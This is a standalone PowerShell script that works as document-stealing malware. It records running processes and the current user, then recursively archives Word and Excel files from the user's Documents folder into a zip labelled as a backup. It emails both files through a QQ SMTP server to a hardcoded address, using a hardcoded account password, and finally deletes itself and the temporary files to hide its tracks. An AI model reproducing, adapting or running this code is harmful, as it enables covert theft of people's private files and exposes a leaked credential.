get-process >> process.txt
$whoami = whoami


$data = dir "$home\Documents" -filter *.xls -recurse
$data | Foreach-Object{
	Compress-Archive -Update -Path $_.FullName -DestinationPath bakcup.zip
}

$data = dir "$home\Documents" -filter *.doc -recurse
$data | Foreach-Object{
	Compress-Archive -Update -Path $_.FullName -DestinationPath bakcup.zip
}
$data = dir "$home\Documents" -filter *.xlsx -recurse
$data | Foreach-Object{
	Compress-Archive -Update -Path $_.FullName -DestinationPath bakcup.zip
}




$smtpServer = "smtp.qq.com"
$smtpUser = "hk_snow@qq.com"
$smtpPassword = "vnkaewsoxhjkeafg"
#create the mail message
$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$MailAddress="hk_snow@qq.com"
$MailtoAddress="hk_snow@qq.com"
$mail.From = New-Object System.Net.Mail.MailAddress($MailAddress)
$mail.To.Add($MailtoAddress)
#set the content
$mail.Subject = $whoami;
$mail.Priority = "High"
$mail.Body = "Hello Powershell"
$filename="process.txt"	#add file
$attachment = new-Object System.Net.Mail.Attachment($filename)

$filename1 = 'bakcup.zip'
$attachment1 = new-Object System.Net.Mail.Attachment($filename1)
$mail.Attachments.Add($attachment)
$mail.Attachments.Add($attachment1)
#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList $smtpServer
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpUser,$smtpPassword
$smtp.Send($mail)
$main.Attachments.Dispose()
remove-item $MyInvocation.MyCommand.Path -force
remove-item 'process.txt'
remove-item 'bakcup.zip'